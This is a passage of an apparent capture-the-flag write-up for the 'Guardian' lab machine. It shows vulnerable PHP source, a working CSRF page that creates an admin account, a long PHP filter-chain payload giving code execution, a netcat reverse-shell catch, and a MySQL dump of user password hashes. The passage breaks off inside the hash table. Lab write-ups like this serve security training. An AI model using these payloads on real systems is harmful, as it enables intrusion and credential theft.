class="string">&#x27;user_role&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for empty fields</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$username</span>) || <span class="keyword">empty</span>(<span class="variable">$password</span>) || <span class="keyword">empty</span>(<span class="variable">$full_name</span>) || <span class="keyword">empty</span>(<span class="variable">$email</span>) || <span class="keyword">empty</span>(<span class="variable">$dob</span>) || <span class="keyword">empty</span>(<span class="variable">$address</span>) || <span class="keyword">empty</span>(<span class="variable">$user_role</span>)) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;All fields are required. Please fill in all fields.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span> . <span class="variable">$salt</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">            <span class="string">&#x27;password_hash&#x27;</span> =&gt; <span class="variable">$password</span>,</span><br><span class="line">            <span class="string">&#x27;full_name&#x27;</span> =&gt; <span class="variable">$full_name</span>,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$email</span>,</span><br><span class="line">            <span class="string">&#x27;dob&#x27;</span> =&gt; <span class="variable">$dob</span>,</span><br><span class="line">            <span class="string">&#x27;address&#x27;</span> =&gt; <span class="variable">$address</span>,</span><br><span class="line">            <span class="string">&#x27;user_role&#x27;</span> =&gt; <span class="variable">$user_role</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$userModel</span>-&gt;<span class="title function_ invoke__">create</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /admin/users.php?created=true&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;Failed to create user. Please try again.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The logical part of the csrf_token can be seen in <code>csrf-tokens.php</code>:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$global_tokens_file</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/tokens.json&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_token_pool</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$global_tokens_file</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$global_tokens_file</span>) ? <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$global_tokens_file</span>), <span class="literal">true</span>) : [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_token_to_pool</span>(<span class="params"><span class="variable">$token</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$global_tokens_file</span>;</span><br><span class="line">    <span class="variable">$tokens</span> = <span class="title function_ invoke__">get_token_pool</span>();</span><br><span class="line">    <span class="variable">$tokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$global_tokens_file</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$tokens</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_token</span>(<span class="params"><span class="variable">$token</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tokens</span> = <span class="title function_ invoke__">get_token_pool</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$token</span>, <span class="variable">$tokens</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>There is no deletion logic here — CSRF tokens are never invalidated after use, so any previously generated token remains valid forever. We grab a valid CSRF token from the page source and craft <code>exploit.html</code>:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Exploit<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSRF Exploit Test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://portal.guardian.htb/admin/createuser.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kujen&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kUjen123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;full_name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Kujen Attack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kujen@kujen.htb&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dob&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1999-01-01&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wiw&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_role&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3af90c590e90f9de8dd9bfd612d7e794&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrfForm&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We create a notice and put the link to our server on the referral link. The admin bot visits it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on :: port 80 (http://[::]:80/) ...</span><br><span class="line">::ffff:10.10.11.84 - - [03/Sep/2025 09:20:39] &quot;GET /poc.html HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we have a fully privileged admin account <code>kujen:kUjen123</code>.</p>
+<h2 id="LFI-via-PHP-Filter-Chains"><a href="#LFI-via-PHP-Filter-Chains" class="headerlink" title="LFI via PHP Filter Chains"></a>LFI via PHP Filter Chains</h2><p>As admin, we discover the LFI in <a class="link"   target="_blank" rel="noopener" href="http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php" >Reports Menu <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<p>Source code of <code>reports.php</code>:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config/db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAuthenticated</span>() || <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$report</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;report&#x27;</span>] ?? <span class="string">&#x27;reports/academic.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$report</span>, <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Malicious request blocked 🚫 &lt;/h2&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(.*(enrollment|academic|financial|system)\.php)$/&#x27;</span>, <span class="variable">$report</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Access denied. Invalid file 🚫&lt;/h2&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>If the path contains <code>..</code> (directory traversal attempts), it is rejected outright. Only four types of files are allowed: <code>enrollment.php</code>, <code>academic.php</code>, <code>financial.php</code>, <code>system.php</code> (and they may have path prefixes). If it doesn’t match, it gets rejected.</p>
+<p>PHP filter chains can be used here to attack — the last spliced <code>system.php</code> will not affect the execution result. We generate the full filter chain payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure></div>
+
+<p>We add <code>,system.php</code> at the end to bypass the regex detection.</p>
+<p>We catch the shell:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen\Downloads&gt; .\nc.exe -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.16] from (UNKNOWN) [10.10.11.84] 49742</span><br><span class="line">id</span><br><span class="line">sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$ uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Lateral-Movement-Hash-Cracking"><a href="#Lateral-Movement-Hash-Cracking" class="headerlink" title="Lateral Movement - Hash Cracking"></a>Lateral Movement - Hash Cracking</h2><p>From the shell, we enumerate internal services:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ss -tuln</span><br><span class="line">Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess</span><br><span class="line">udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*</span><br><span class="line">tcp   LISTEN 0      128             [::]:22            [::]:*</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div>
+
+<p>Port 3306 is MySQL and port 3000 is Gitea. We connect to MySQL using the root credentials found earlier and dump the user hashes:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password_hash from users;</span><br><span class="line">select username,password_hash from users;</span><br><span class="line">+--------------------+------------------------------------------------------------------+</span><br><span class="line">| username           | password_hash                                                    |</span><br><span class="line">+--------------------+------------------------------------------------------------------+</span><br><span class="line">| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |</span><br><span class="line">| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |</span><br><span 